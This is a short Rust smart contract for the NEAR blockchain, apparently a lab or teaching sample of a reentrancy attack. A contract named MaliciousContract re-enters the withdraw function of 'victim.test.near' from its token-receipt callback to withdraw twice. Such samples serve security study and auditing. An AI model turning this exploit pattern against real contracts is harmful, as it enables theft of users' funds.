use near_sdk::borsh::{self, BorshDeserialize, BorshSerialize};
use near_sdk::{env, near_bindgen,ext_contract};



const GAS_FOR_SINGLE_CALL: u64 = 20000000000000;

pub const VICTIM: &str = "victim.test.near";

#[ext_contract]
pub trait ExtVictim {
    fn withdraw(&mut self,amount: u128)-> u128;
}


#[near_bindgen]
#[derive(BorshDeserialize, BorshSerialize)]
pub struct MaliciousContract {
    decreased: u128,
    reentered: bool
}

impl Default for MaliciousContract {
    fn default() -> Self {
        Self {
            decreased: 0,
            reentered: false
        }
    }
}

#[near_bindgen]
impl MaliciousContract {
    pub fn ft_on_transfer(&mut self, amount: u128){
        // 恶意合约的收币函数
        if self.reentered == false{
            ext_victim::withdraw(
                amount.into(), 
                &VICTIM, 
                0, 
                env::prepaid_gas() - GAS_FOR_SINGLE_CALL
                );
        }
        self.reentered = true;
    }


    pub fn malicious_call(&mut self, amount:u128){
        ext_victim::withdraw(
            amount.into(), 
            &VICTIM, 
            0, 
            env::prepaid_gas() - GAS_FOR_SINGLE_CALL
            );
    }
}
